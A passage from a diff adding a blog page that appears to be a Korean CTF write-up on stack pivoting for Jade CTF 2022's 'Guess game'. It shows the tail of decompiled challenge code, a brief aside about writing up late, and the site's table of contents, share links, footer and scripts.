class="number">0x4F</span>uLL);</span><br><span class="line">  result = fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">-559038737</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Did you cheat?\n&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>늦장 부리다가 롸업을 너무 늦게 작성했다. 이 씨텝… 서버 오래 살아있어서 좋았는데 롸업 작성할 당시 서버가 닫혔다. 롸업은.. 제때제때 빨리빨리 작성하자 T_T.</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info"><span class="toc-number">1.</span> <span class="toc-text">Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#for-player"><span class="toc-number">1.1.</span> <span class="toc-text">for player</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mitigation"><span class="toc-number">2.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code"><span class="toc-number">2.2.</span> <span class="toc-text">Source Code</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-even-option"><span class="toc-number">2.2.1.</span> <span class="toc-text">1. even_option()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-odd-option"><span class="toc-number">2.2.2.</span> <span class="toc-text">2. odd_option()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text">Vulnerability</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Scenario"><span class="toc-number">3.1.</span> <span class="toc-text">Exploit Scenario</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PART1"><span class="toc-number">3.1.1.</span> <span class="toc-text">PART1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PART2"><span class="toc-number">3.1.2.</span> <span class="toc-text">PART2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">3.2.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">3.3.</span> <span class="toc-text">Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tmi"><span class="toc-number">4.</span> <span class="toc-text">tmi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1"><span class="toc-number">4.0.1.</span> <span class="toc-text">1.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2"><span class="toc-number">4.0.2.</span> <span class="toc-text">2.</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/221028-jadectf2022-guess_game/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&text=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&title=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&is_video=false&description=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Jade CTF 2022 - Guess game (Stack pivoting)&body=Check out this article: https://jiravvit.github.io/221028-jadectf2022-guess_game/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&title=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&title=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&title=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&title=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&name=Jade CTF 2022 - Guess game (Stack pivoting)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/221028-jadectf2022-guess_game/&t=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
